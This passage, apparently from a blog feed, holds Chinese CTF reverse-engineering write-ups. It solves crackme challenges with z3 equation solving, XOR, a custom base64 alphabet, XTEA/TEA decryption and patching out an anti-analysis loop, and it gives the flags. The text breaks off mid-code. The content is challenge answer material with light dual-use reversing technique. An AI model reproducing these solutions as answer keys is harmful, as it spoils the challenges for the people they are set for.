class="number">28</span> + a8 * <span class="number">15</span> - a9 * <span class="number">6</span>) + a10 * <span class="number">45</span> + a11 * <span class="number">31</span> + a12 * <span class="number">7</span> - a13 * <span class="number">67</span>) + a14 * <span class="number">78</span> == <span class="number">24065</span>) &amp; ((((a1 * <span class="number">47</span> + a2 * <span class="number">64</span> + a3 * <span class="number">66</span> - a4 * <span class="number">5</span>) + a5 * <span class="number">43</span> + a6 * <span class="number">112</span> + a7 * <span class="number">25</span> + a8 * <span class="number">13</span> - a9 * <span class="number">35</span>) + a10 * <span class="number">95</span> + a11 * <span class="number">21</span> + a12 * <span class="number">43</span> - a13 * <span class="number">61</span>) + a14 * <span class="number">20</span> == <span class="number">27687</span>) &amp; (((a1 * <span class="number">89</span> + a2 * <span class="number">67</span> + a3 * <span class="number">85</span> - a4 * <span class="number">25</span>) + a5 * <span class="number">49</span> + a6 * <span class="number">89</span> + a7 * <span class="number">23</span> + a8 * <span class="number">56</span> - a9 * <span class="number">92</span>) + a10 * <span class="number">14</span> + a11 * <span class="number">89</span> + a12 * <span class="number">47</span> - a13 * <span class="number">61</span> - a14 * <span class="number">29</span> == <span class="number">29250</span>) &amp; (((a1 * <span class="number">95</span> + a2 * <span class="number">34</span> + a3 * <span class="number">62</span> - a4 * <span class="number">9</span> - a5 * <span class="number">43</span>) + a6 * <span class="number">83</span> + a7 * <span class="number">25</span> + a8 * <span class="number">12</span> - a9 * <span class="number">36</span>) + a10 * <span class="number">16</span> + a11 * <span class="number">51</span> + a12 * <span class="number">47</span> - a13 * <span class="number">60</span> - a14 * <span class="number">24</span> == <span class="number">15317</span>):</span><br><span class="line">    print(<span class="string">&#x27;flag is GWHT&#123;md5(your_input)&#125;&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;Congratulations and have fun!&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">&#x27;Sorry,plz try again...&#x27;</span>)</span><br></pre></td></tr></table></figure><p>方程组+异或</p><blockquote><p>exp</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">x=Solver()</span><br><span class="line">a1,a2,a3,a4,a5,a6,a7,a8,a9,a10,a11,a12,a13,a14=Ints(<span class="string">&quot;a1 a2 a3 a4 a5 a6 a7 a8 a9 a10 a11 a12 a13 a14&quot;</span>)</span><br><span class="line">x.add(a1 * <span class="number">88</span> + a2 * <span class="number">67</span> + a3 * <span class="number">65</span> - a4 * <span class="number">5</span> + a5 * <span class="number">43</span> + a6 * <span class="number">89</span> + a7 * <span class="number">25</span> + a8 * <span class="number">13</span> - a9 * <span class="number">36</span> + a10 * <span class="number">15</span> + a11 * <span class="number">11</span> + a12 * <span class="number">47</span> - a13 * <span class="number">60</span> + a14 * <span class="number">29</span> == <span class="number">22748</span>)</span><br><span class="line">x.add(a1 * <span class="number">89</span> + a2 * <span class="number">7</span> + a3 * <span class="number">12</span> - a4 * <span class="number">25</span> + a5 * <span class="number">41</span> + a6 * <span class="number">23</span> + a7 * <span class="number">20</span> - a8 * <span class="number">66</span> + a9 * <span class="number">31</span> + a10 * <span class="number">8</span> + a11 * <span class="number">2</span> - a12 * <span class="number">41</span> - a13 * <span class="number">39</span> + a14 * <span class="number">17</span> == <span class="number">7258</span>)</span><br><span class="line">x.add(a1 * <span class="number">28</span> + a2 * <span class="number">35</span> + a3 * <span class="number">16</span> - a4 * <span class="number">65</span> + a5 * <span class="number">53</span> + a6 * <span class="number">39</span> + a7 * <span class="number">27</span> + a8 * <span class="number">15</span> - a9 * <span class="number">33</span> + a10 * <span class="number">13</span> + a11 * <span class="number">101</span> + a12 * <span class="number">90</span> - a13 * <span class="number">34</span> + a14 * <span class="number">23</span> == <span class="number">26190</span>)</span><br><span class="line">x.add(a1 * <span class="number">23</span> + a2 * <span class="number">34</span> + a3 * <span class="number">35</span> - a4 * <span class="number">59</span> + a5 * <span class="number">49</span> + a6 * <span class="number">81</span> + a7 * <span class="number">25</span> + a8 * <span class="number">128</span> - a9 * <span class="number">32</span> + a10 * <span class="number">75</span> + a11 * <span class="number">81</span> + a12 * <span class="number">47</span> - a13 * <span class="number">60</span> + a14 * <span class="number">29</span> == <span class="number">37136</span>)</span><br><span class="line">x.add(a1 * <span class="number">38</span> + a2 * <span class="number">97</span> + a3 * <span class="number">35</span> - a4 * <span class="number">52</span> + a5 * <span class="number">42</span> + a6 * <span class="number">79</span> + a7 * <span class="number">90</span> + a8 * <span class="number">23</span> - a9 * <span class="number">36</span> + a10 * <span class="number">57</span> + a11 * <span class="number">81</span> + a12 * <span class="number">42</span> - a13 * <span class="number">62</span> - a14 * <span class="number">11</span> == <span class="number">27915</span>)</span><br><span class="line">x.add(a1 * <span class="number">22</span> + a2 * <span class="number">27</span> + a3 * <span class="number">35</span> - a4 * <span class="number">45</span> + a5 * <span class="number">47</span> + a6 * <span class="number">49</span> + a7 * <span class="number">29</span> + a8 * <span class="number">18</span> - a9 * <span class="number">26</span> + a10 * <span class="number">35</span> + a11 * <span class="number">41</span> + a12 * <span class="number">40</span> - a13 * <span class="number">61</span> + a14 * <span class="number">28</span> == <span class="number">17298</span>)</span><br><span class="line">x.add(a1 * <span class="number">12</span> + a2 * <span class="number">45</span> + a3 * <span class="number">35</span> - a4 * <span class="number">9</span> - a5 * <span class="number">42</span> + a6 * <span class="number">86</span> + a7 * <span class="number">23</span> + a8 * <span class="number">85</span> - a9 * <span class="number">47</span> + a10 * <span class="number">34</span> + a11 * <span class="number">76</span> + a12 * <span class="number">43</span> - a13 * <span class="number">44</span> + a14 * <span class="number">65</span> == <span class="number">19875</span>)</span><br><span class="line">x.add(a1 * <span class="number">79</span> + a2 * <span class="number">62</span> + a3 * <span class="number">35</span> - a4 * <span class="number">85</span> + a5 * <span class="number">33</span> + a6 * <span class="number">79</span> + a7 * <span class="number">86</span> + a8 * <span class="number">14</span> - a9 * <span class="number">30</span> + a10 * <span class="number">25</span> + a11 * <span class="number">11</span> + a12 * <span class="number">57</span> - a13 * <span class="number">50</span> - a14 * <span class="number">9</span> == <span class="number">22784</span>)</span><br><span class="line">x.add(a1 * <span class="number">8</span> + a2 * <span class="number">6</span> + a3 * <span class="number">64</span> - a4 * <span class="number">85</span> + a5 * <span class="number">73</span> + a6 * <span class="number">29</span> + a7 * <span class="number">2</span> + a8 * <span class="number">23</span> - a9 * <span class="number">36</span> + a10 * <span class="number">5</span> + a11 * <span class="number">2</span> + a12 * <span class="number">47</span> - a13 * <span class="number">64</span> + a14 * <span class="number">27</span> == <span class="number">9710</span>)</span><br><span class="line">x.add(a1 * <span class="number">67</span> - a2 * <span class="number">68</span> + a3 * <span class="number">68</span> - a4 * <span class="number">51</span> - a5 * <span class="number">43</span> + a6 * <span class="number">81</span> + a7 * <span class="number">22</span> - a8 * <span class="number">12</span> - a9 * <span class="number">38</span> + a10 * <span class="number">75</span> + a11 * <span class="number">41</span> + a12 * <span class="number">27</span> - a13 * <span class="number">52</span> + a14 * <span class="number">31</span> == <span class="number">13376</span>)</span><br><span class="line">x.add(a1 * <span class="number">85</span> + a2 * <span class="number">63</span> + a3 * <span class="number">5</span> - a4 * <span class="number">51</span> + a5 * <span class="number">44</span> + a6 * <span class="number">36</span> + a7 * <span class="number">28</span> + a8 * <span class="number">15</span> - a9 * <span class="number">6</span> + a10 * <span class="number">45</span> + a11 * <span class="number">31</span> + a12 * <span class="number">7</span> - a13 * <span class="number">67</span> + a14 * <span class="number">78</span> == <span class="number">24065</span>)</span><br><span class="line">x.add(a1 * <span class="number">47</span> + a2 * <span class="number">64</span> + a3 * <span class="number">66</span> - a4 * <span class="number">5</span> + a5 * <span class="number">43</span> + a6 * <span class="number">112</span> + a7 * <span class="number">25</span> + a8 * <span class="number">13</span> - a9 * <span class="number">35</span> + a10 * <span class="number">95</span> + a11 * <span class="number">21</span> + a12 * <span class="number">43</span> - a13 * <span class="number">61</span> + a14 * <span class="number">20</span> == <span class="number">27687</span>)</span><br><span class="line">x.add(a1 * <span class="number">89</span> + a2 * <span class="number">67</span> + a3 * <span class="number">85</span> - a4 * <span class="number">25</span> + a5 * <span class="number">49</span> + a6 * <span class="number">89</span> + a7 * <span class="number">23</span> + a8 * <span class="number">56</span> - a9 * <span class="number">92</span> + a10 * <span class="number">14</span> + a11 * <span class="number">89</span> + a12 * <span class="number">47</span> - a13 * <span class="number">61</span> - a14 * <span class="number">29</span> == <span class="number">29250</span>)</span><br><span class="line">x.add(a1 * <span class="number">95</span> + a2 * <span class="number">34</span> + a3 * <span class="number">62</span> - a4 * <span class="number">9</span> - a5 * <span class="number">43</span> + a6 * <span class="number">83</span> + a7 * <span class="number">25</span> + a8 * <span class="number">12</span> - a9 * <span class="number">36</span> + a10 * <span class="number">16</span> + a11 * <span class="number">51</span> + a12 * <span class="number">47</span> - a13 * <span class="number">60</span> - a14 * <span class="number">24</span> == <span class="number">15317</span>)</span><br><span class="line"><span class="keyword">if</span> x.check()==sat:</span><br><span class="line">    print(x.model())</span><br><span class="line">    </span><br><span class="line">a=[<span class="number">10</span>,<span class="number">24</span>,<span class="number">119</span>,<span class="number">7</span>,<span class="number">104</span>,<span class="number">43</span>,<span class="number">28</span>,<span class="number">91</span>,<span class="number">108</span>,<span class="number">52</span>,<span class="number">88</span>,<span class="number">74</span>,<span class="number">88</span>,<span class="number">33</span>]</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)<span class="number">-2</span>,<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">    flag+=<span class="built_in">chr</span>(a[i]^a[i+<span class="number">1</span>])</span><br><span class="line">    a[i]=a[i]^a[i+<span class="number">1</span>]</span><br><span class="line">flag = flag[::<span class="number">-1</span>]</span><br><span class="line">flag += <span class="built_in">chr</span>(<span class="number">33</span>)</span><br><span class="line"><span class="keyword">import</span> hashlib <span class="keyword">as</span> hb</span><br><span class="line">print(<span class="string">&quot;flag&#123;&quot;</span>+hb.md5(<span class="built_in">str</span>(flag).encode()).hexdigest()+<span class="string">&quot;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><blockquote><p>flag{58964088b637e50d3a22b9510c1d1ef8}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>V-N2020 公开赛</title>
      <link href="/2021/03/28/V-N2020-%E5%85%AC%E5%BC%80%E8%B5%9B/"/>
      <url>/2021/03/28/V-N2020-%E5%85%AC%E5%BC%80%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h1 id="CSRe"><a href="#CSRe" class="headerlink" title="CSRe"></a>CSRe</h1><a id="more"></a><p>Exeinfo PE查看程序，为C#，而且被混淆。<br>de4dot去除混淆。</p><p><img src="/2021/03/28/V-N2020-%E5%85%AC%E5%BC%80%E8%B5%9B/1.png"></p><p>拖入dnSpy32位中。</p><p><img src="/2021/03/28/V-N2020-%E5%85%AC%E5%BC%80%E8%B5%9B/2.png"></p><p><img src="/2021/03/28/V-N2020-%E5%85%AC%E5%BC%80%E8%B5%9B/3.png"></p><p>然后去在线解密，第一个解出来为314159，第二个为return.</p><blockquote><p>flag{1415turn}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF</title>
      <link href="/2021/03/28/DASCTF/"/>
      <url>/2021/03/28/DASCTF/</url>
      
        <content type="html"><![CDATA[<h1 id="Enjoyit-1"><a href="#Enjoyit-1" class="headerlink" title="Enjoyit-1"></a>Enjoyit-1</h1><a id="more"></a><p>首先查看文件信息</p><p><img src="/2021/03/28/DASCTF/1.png"></p><p>是C#文件，32位，放入dnSpy32位中。</p><p><img src="/2021/03/28/DASCTF/2.png"></p><p>第18行是输入判断，输入的字符范围为ASCII码95-122位。<br>第21行是变过密码表的base64加密并判断是否与yQXHyBvN3g/81gv51QXG1QTBxRr/yvXK1hC=相等。<br>第26-29行是一个循环，运行程序这个循环会运行100000秒。<br>第31行是xtea加密的变形。<br>第37-41行是一个异或。</p><h2 id="方法一：静态分析"><a href="#方法一：静态分析" class="headerlink" title="方法一：静态分析"></a>方法一：静态分析</h2><p>base64解密：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> a[]=<span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> b[]=<span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZ=&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> c[]=<span class="string">&quot;yQXHyBvN3g/81gv51QXG1QTBxRr/yvXK1hC=&quot;</span>;</span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(c);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="built_in">strlen</span>(a);j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(b[j]==c[i])</span><br><span class="line">            &#123;</span><br><span class="line">                c[i]=a[j];</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(c);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,c[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>原密文:Y29tYnVzdGlibGVfb29sb25nX3RlYV9wbHo=<br>在线解密得：combustible_oolong_tea_plz</p></blockquote><p>有xtea加密得到的array：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encipher</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> num_rounds, <span class="keyword">uint32_t</span> v[<span class="number">2</span>], <span class="keyword">uint32_t</span> <span class="keyword">const</span> key[<span class="number">26</span>])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], sum=<span class="number">0</span>, delta=<span class="number">2654435464U</span>;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; num_rounds; i++) &#123;</span><br><span class="line">        v0 += (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">        sum += delta;</span><br><span class="line">        v1 += (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum&gt;&gt;<span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"> <span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> v[<span class="number">2</span>]=&#123;<span class="number">288</span>,<span class="number">369</span>&#125;;</span><br><span class="line">    <span class="keyword">uint32_t</span> <span class="keyword">const</span> k[<span class="number">26</span>]=&#123;<span class="number">0x63</span>,<span class="number">0x6f</span>,<span class="number">0x6d</span>,<span class="number">0x62</span>,<span class="number">0x75</span>,<span class="number">0x73</span>,<span class="number">0x74</span>,<span class="number">0x69</span>,<span class="number">0x62</span>,<span class="number">0x6c</span>,<span class="number">0x65</span>,<span class="number">0x5f</span>,<span class="number">0x6f</span>,<span class="number">0x6f</span>,<span class="number">0x6c</span>,<span class="number">0x6f</span>,<span class="number">0x6e</span>,<span class="number">0x67</span>,<span class="number">0x5f</span>,<span class="number">0x74</span>,<span class="number">0x65</span>,<span class="number">0x61</span>,<span class="number">0x5f</span>,<span class="number">0x70</span>,<span class="number">0x6c</span>,<span class="number">0x7a</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> r=<span class="number">32</span>;</span><br><span class="line">    encipher(r, v, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%0x%0x&quot;</span>,v[<span class="number">0</span>],v[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将所得的数字当作字符串</p><blockquote><p>6308fe34b7fe6fdb</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> a[<span class="number">32</span>]=&#123; <span class="number">2</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">84</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">87</span>, <span class="number">3</span>, <span class="number">86</span>, <span class="number">3</span>, <span class="number">80</span>, <span class="number">7</span>, <span class="number">83</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">83</span>, <span class="number">94</span>, <span class="number">7</span>, <span class="number">84</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">83</span>, <span class="number">3</span>, <span class="number">84</span>, <span class="number">6</span>, <span class="number">83</span>, <span class="number">5</span>, <span class="number">80</span> &#125;;</span><br><span class="line">    <span class="keyword">char</span> b[<span class="number">16</span>]=<span class="string">&quot;6308fe34b7fe6fdb&quot;</span>;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        a[i]=a[i]^b[i%<span class="number">16</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;flag&#123;%s&#125;&quot;</span>,a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>flag{4645e180540ffa7a67cfa174cde105a2}</p></blockquote><h2 id="方法二：修改程序"><a href="#方法二：修改程序" class="headerlink" title="方法二：修改程序"></a>方法二：修改程序</h2><p>我们若直接输入combustible_oolong_tea_plz，程序运行100000秒后才会出flag，这是因为26-29行的循环。<br>只要把这个循环删去就行了。比静态分析简单多了。<br><img src="/2021/03/28/DASCTF/3.png"></p><blockquote><p>flag{4645e180540ffa7a67cfa174cde105a2}</p></blockquote><h1 id="drinkSomeTea"><a href="#drinkSomeTea" class="headerlink" title="drinkSomeTea"></a>drinkSomeTea</h1><p>32位文件，无壳</p><p><img src="/2021/03/28/DASCTF/4.PNG"></p><p>进入main函数f5</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  HANDLE v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">void</span> *v4; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  DWORD v6; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">char</span> *v7; <span class="comment">// esi</span></span><br><span class="line">  DWORD v8; <span class="comment">// ebx</span></span><br><span class="line">  HANDLE v9; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">void</span> *v10; <span class="comment">// esi</span></span><br><span class="line">  DWORD NumberOfBytesRead; <span class="comment">// [esp+Ch] [ebp-8h]</span></span><br><span class="line">  DWORD NumberOfBytesWritten; <span class="comment">// [esp+10h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  sub_401000();</span><br><span class="line">  sub_4013B2(aWelcomeToMyTea);</span><br><span class="line">  v3 = CreateFileA(FileName, <span class="number">0xC0000000</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3u</span>, <span class="number">0x80</span>u, <span class="number">0</span>);</span><br><span class="line">  v4 = v3;</span><br><span class="line">  <span class="keyword">if</span> ( v3 == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_4013B2(aIThinkYouDoNot);</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v6 = GetFileSize(v3, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v6 &lt; <span class="number">0xEA60</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      SetFilePointer(v4, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">      NumberOfBytesRead = <span class="number">0</span>;</span><br><span class="line">      ReadFile(v4, &amp;unk_409988, v6, &amp;NumberOfBytesRead, <span class="number">0</span>);</span><br><span class="line">      CloseHandle(v4);</span><br><span class="line">      <span class="keyword">if</span> ( (v6 &gt;&gt; <span class="number">3</span>) &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v7 = &amp;unk_409988;</span><br><span class="line">        v8 = v6 &gt;&gt; <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          (loc_4010A0)(v7, &amp;unk_407030);</span><br><span class="line">          v7 += <span class="number">8</span>;</span><br><span class="line">          --v8;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( v8 );</span><br><span class="line">      &#125;</span><br><span class="line">      v9 = CreateFileA(aTeaPngOut, <span class="number">0xC0000000</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2u</span>, <span class="number">0x80</span>u, <span class="number">0</span>);</span><br><span class="line">      v10 = v9;</span><br><span class="line">      <span class="keyword">if</span> ( v9 == <span class="number">-1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_4013B2(aIThinkYouDoNot);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        NumberOfBytesWritten = <span class="number">0</span>;</span><br><span class="line">        WriteFile(v9, &amp;unk_409988, v6, &amp;NumberOfBytesWritten, <span class="number">0</span>);</span><br><span class="line">        CloseHandle(v10);</span><br><span class="line">        sub_4013B2(aNowThisCupOfTe);</span><br><span class="line">      &#125;</span><br><span class="line">      result = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      sub_4013B2(aYourTeaIsTooHo);</span><br><span class="line">      result = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大致意思就是读取tea.png，经过(loc_4010A0)(v7, &amp;unk_407030)后，得到了文件tea.png.out<br>loc_4010A0有一个花指令</p><p><img src="/2021/03/28/DASCTF/5.PNG"></p><p>按‘d’转为数据</p><p><img src="/2021/03/28/DASCTF/6.PNG"></p><p>nop掉0E8h，剩余部分按‘c’转为代码</p><p><img src="/2021/03/28/DASCTF/7.PNG"></p><p>按‘p’创建函数，然后就能f5了</p><p><img src="/2021/03/28/DASCTF/8.PNG"></p><p>密钥</p><p><img src="/2021/03/28/DASCTF/9.PNG"></p><p>这个tea加密的数据都是interesting型的，所以要将普通的脚本改一下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decrypt</span> <span class="params">(<span 